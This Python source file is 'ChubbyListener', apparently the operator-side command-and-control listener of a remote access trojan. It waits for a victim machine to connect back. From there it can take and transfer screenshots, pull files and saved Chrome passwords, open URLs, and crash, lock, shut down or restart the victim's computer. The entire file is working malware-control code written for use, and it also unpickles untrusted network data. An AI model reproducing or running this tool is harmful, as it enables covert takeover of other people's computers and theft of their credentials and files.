#! /usr/share/python 3

import socket
import subprocess
import sys
import os
import time
import signal
import readline
import pickle
import struct
import base64
from io import StringIO, BytesIO
import base64
from PIL import Image
import datetime

subprocess.call(['clear'])

GREEN = '\33[32m'
RED = '\33[31m'
YELLOW = '\33[33m'
CYAN = '\033[1;36m'
VIOLET = '\33[35m'
BLUE = '\33[34m'
END = '\33[0m'
BOLD = '\33[1m'
CURL = '\33[4m'

restarting = (YELLOW + BOLD + '\n[!] Trying to restart... ' + END)
restartTerminal = (YELLOW + BOLD + '[!] Sometimes restarting the terminal may help... ' + END)
failed = (RED + BOLD + '[!] Failed!' + END)

def signal_handler(sig, frame):
    print(RED + BOLD + '\n\nQuitting...\n' + END)
    sys.exit(0)

def printBanner():
    print(BLUE + BOLD + '                    ____     ____')
    print("                  /'    |   |    \\")
    print('                /    /  |   | \   \\')
    print('              /    / |  |   |  \   \\')
    print('             (   /   |  """"   |\   \ ' + END + BOLD + '   Ahhh HA!!!')
    print(BLUE + BOLD + '             | /   / /^\    /^\  \  _| ' + END + BOLD + '       I love big big carrot!!!')
    print(BLUE + BOLD + '              ~   | |   |  |   | | ~')
    print('                  | |__' + END + BOLD + 'O' + BLUE + BOLD + '|__|' + END + BOLD + 'O' + BLUE + BOLD + '__| |')
    print('                /~~      \/     ~~\\')
    print('               /   (      |      )  \\')
    print("         _--_  /,   \____/^\___/'   \  _--_")
    print('       /~    ~\ / -____-|_|_|-____-\ /~    ~\\')
    print('     /________|___/~~~~\___/~~~~\ __|________\\')
    print('--~~~          ^ |     |   |     |  -     :  ~~~~~:~-_     ___-----~~~~~~~~|')
    print("   /             `^-^-^'   `^-^-^'                  :  ~\ /'   ____/--------|")
    print(' ;                                    :              :    |----------/--------|')
    print(':          ,   ' + VIOLET + BOLD + 'ChubbyListener:' + RED + BOLD + ' v1.0.0' + BLUE + BOLD + '             ;    .  |---\\--------------|')
    print(' :     -      ' + VIOLET + BOLD + 'Writen by:' + RED + BOLD + ' 0BL1V10N V01D' + BLUE + BOLD + ' .              : : |______________-__|')
    print("  :              ,                 ,                :   /'~----___________|")
    print('__  \\\        ^                          ,, ;; ;; ;._-~')
    print('  ~~~-----____________________________________----~~~')

def socketCreate():
    try:
        global host
        global port
        global showPort
        global s

        host = input(GREEN + BOLD + '\nSet LHOST: ' + END)
        port = input('\n' + GREEN + BOLD + 'Set LPORT: ' + END)

        port = int(port)
        showPort = str(port)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print(failed)

def socketBind():
    try:
        s.bind((host, port))
    except socket.error:
        print(failed)
        print(restarting)
        print(restartTerminal)
        subprocess.call(['clear'])
        socketBind()

def listening():
    s.listen(1)
    print(GREEN + BOLD + '\n[*] Listening on ' + END + CYAN + host + ':' + showPort + END)

def socketAccept():
    global conn
    global addr

    conn, addr, = s.accept()
    print(GREEN + BOLD + '\n[*] Session opened at ' + END + CYAN + addr[0] + ':' + str(addr[1]) + '\n' + END)

    sendCommands(conn)

def sendCommands(conn):
    while True:
        cmd = input(CYAN + str(addr[0]) + ':' + str(addr[1]) + ' > ' + END)

        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        elif cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        elif cmd == 'help':
            print('                   ')
            print('Help Commands')
            print('=============')
            print('                   ')
            print('Commands                 Description')
            print('--------                 -----------')
            print('quit                     Exit script')
            print('exit                     Quit script')
            print('sysinfo                  View basic client information')
            print('screenshot               Take a screenshot of machine')
            print('download -s              Download screenshot to your computer')
            print("download -f [file]       Download a .txt file from victim's machine")
            print("download -c              Download saved password chrome file")
            print("openurl [url]            Open a url page in the victim's machine")
            print("chrome                   Attempt to retrieve saved chrome passwords")
            print('memory                   Print phyiscal and virtual memory')
            print('crash                    Attempt to crash computer')
            print('lock                     Lock computer screen')
            print('shutdown                 Shutdown computer')
            print('restart                  Restart computer')
            print('                     ')
        elif cmd == 'sysinfo':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'clear':
            subprocess.call(['clear'])
        elif cmd == '':
            pass
        elif cmd == 'shutdown':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'restart':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'memory':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), 'utf-8')
            print(clientResponse)
            print('             ')
        elif cmd[:7] == 'openurl':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd == 'crash':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse)
        elif cmd[:4] == 'lock':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print('\n' + clientResponse, end="")
        elif cmd[:11] == 'download -f':
            try:
                conn.send(str.encode(cmd))
                print('\n' + YELLOW + "[!] Please use this for 'txt' or other document file transfers. Use 'download -s' to transfer a taken screenshot. Type Q to quit." + END)
                print(YELLOW + "[!] Recommended download size is no more than 3GBs! ")
                filename = input('\n' + CYAN + '[*] Please enter a filename for the incoming file: ' + END + GREEN)
                file = open('downloads/' + filename, 'wb')
                file_data = conn.recv(1024)
                print(GREEN + BOLD + '\n' + '[*] Downloading...' + END)
                file.write(file_data)
                file.close()
                print(GREEN + BOLD + '[*] Downloaded successfully to downloads/' + filename + END)
            except:
                print(RED + BOLD + '[!] There was an error downloading your file.' + END)
                pass
        elif cmd == 'screenshot':
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print('\n' + clientResponse, end='')
        elif cmd == 'download -s':
            print('                 ')
            print(GREEN + BOLD + '[*] Transfering screenshot... This can take up to 20 seconds...' + END)
            conn.send(str.encode(cmd))
            data = b""
            payload_size = struct.calcsize(">L")
            #print("payload_size: {}".format(payload_size))
            while len(data) < payload_size:
                #print("Recv: {}".format(len(data)))
                data += conn.recv(8192)
            #print("Done Recv: {}".format(len(data)))
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            #print("msg_size: {}".format(msg_size))
            while len(data) < msg_size:
                data += conn.recv(8192)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = base64.b64decode(frame)
            img = Image.open(BytesIO(frame))
            imgname = 'downloads/screenshot' + str(datetime.datetime.now()) + '.png'
            img.save(imgname)
            print(GREEN + BOLD + '[*] Screenshot output in ' + END + CYAN + imgname + END)
            print('                     ')
        elif cmd == 'chrome':
            conn.send(str.encode(cmd))
            print('')
            print(GREEN + BOLD + "[*] Type 'download', let's see if this worked!")
            print('')
        elif cmd == 'download -c':
            try:
                conn.send(str.encode(cmd))
                print('\n' + YELLOW + "[!] Please use this for 'txt' or other document file transfers. Use 'download -s' to transfer a taken screenshot. Type Q to quit." + END)
                print(YELLOW + "[!] Recommended download size is no more than 3GBs! ")
                filename = input('\n' + CYAN + '[*] Please enter a filename for the incoming file: ' + END + GREEN)
                file = open(filename, 'wb')
                file_data = conn.recv(1024)
                print(GREEN + BOLD + '\n' + '[*] Downloading...' + END)
                file.write(file_data)
                file.close()
                print(GREEN + BOLD + '[*] Downloaded successfully to ' + filename + END + '\n')
            except:
                print(RED + BOLD + '[!] There was an error downloading your file (Error is in server source code).' + END + '\n')
                pass

def main():
    signal.signal(signal.SIGINT, signal_handler)

    printBanner()
    socketCreate()
    socketBind()
    listening()
    socketAccept()

if __name__ == '__main__':
    main()
